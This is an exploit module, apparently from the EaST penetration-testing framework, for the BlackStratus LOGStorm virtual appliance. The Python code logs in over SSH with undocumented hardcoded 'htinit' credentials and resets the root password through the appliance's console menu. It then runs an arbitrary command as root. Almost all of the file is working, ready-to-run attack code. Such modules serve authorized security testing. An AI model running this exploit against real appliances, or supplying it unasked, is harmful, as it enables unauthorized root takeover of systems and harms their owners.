#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from time import sleep
from core.Sploit import Sploit
try:
    import paramiko
    from paramiko import ssh_exception
except:
    pass


INFO = {}
INFO['NAME'] = 'blackstratus_logstorm_rce'
INFO['DESCRIPTION'] = 'BlackStratus LOGStorm'
INFO['VENDOR'] = 'http://blackstratus.com/'
INFO['CVE Name'] = 'N/A'
INFO['NOTES'] = '''
BlackStratus LOGStorm has multiple vulnerabilities that allow
a remote unauthenticated user, among other things, to assume
complete control over the virtual appliance with root privileges.
This is possible due to multiple network servers listening for
network connections by default, allowing authorization with
undocumented credentials supported by appliance's OS,
web interface and sql server.
This exploit demonstrates command execution, with root password,
if we haven't root password, we will try reset it with hardcoded
user credentials
'''

INFO['CHANGELOG'] = '13 Dec, 2016. Written by Gleg team.'
INFO['PATH'] = 'Exploits/'
INFO['AUTHOR'] = 'Jeremy Brown [jbrown3264/gmail]'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40858/']
# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1'
OPTIONS['PORT'] = 22
OPTIONS['COMMAND'] = 'id'
OPTIONS['LOGIN'] = 'root'
OPTIONS['PASSWORD'] = 'pass'
OPTIONS['RESET PASSWORD'] = False, dict(description='Change password')
HTINIT_CREDS = ("htinit", "htinit")


class exploit(Sploit):
    def __init__(self, logger=None):
        Sploit.__init__(self, logger=logger, options=OPTIONS)
        self.name = INFO['NAME']
        self.state = 'running'
        return

    def change_pass(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.host, self.port,
                HTINIT_CREDS[0], HTINIT_CREDS[1], timeout=10)
        except ssh_exception.AuthenticationException:
            self.log('Reset failed, could not login with htinit credentials')
            return False
        self.login = self.login if self.login else 'root'
        self.password = self.password if self.password else 'pass'
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('')
        ssh_stdin.write('4' + '\n')
        sleep(2)
        ssh_stdin.write(self.password + '\n')
        sleep(2)
        ssh_stdin.write('^C' + '\n')
        sleep(1)
        self.log('Appliance root password should now be reset')
        self.log('\nLogin: {}\nPassword: {}'.format(self.login, self.password))
        return True

    def command_execute(self):
        if self.reset_password:
            if not self.change_pass():
                return False
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.host, self.port,
                self.login, self.password, timeout=10)
        except ssh_exception.AuthenticationException:
            self.log('Action failed, could not login with root credentials')
            self.log('Try with checked "RESET PASSWORD" option')
            return False
        self.log('Success connect!')
        self.command = self.command if self.command else 'id'
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(self.command)
        data = ssh_stdout.readline()
        return data

    def exploit(self):
        try:
            import paramiko
            from paramiko import ssh_exception
        except:
            self.log('For this module need install paramiko library')
            return False
        data = self.command_execute()
        if data:
            self.log(data)
            return True
        return False

    def run(self):
        if self.exploit():
            self.finish(True)
            return 1
        else:
            self.finish(False)
            return 0

if __name__ == '__main__':
    '''
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    '''
    print 'Running exploit %s .. ' % INFO['NAME']
    e = exploit()
    e.run()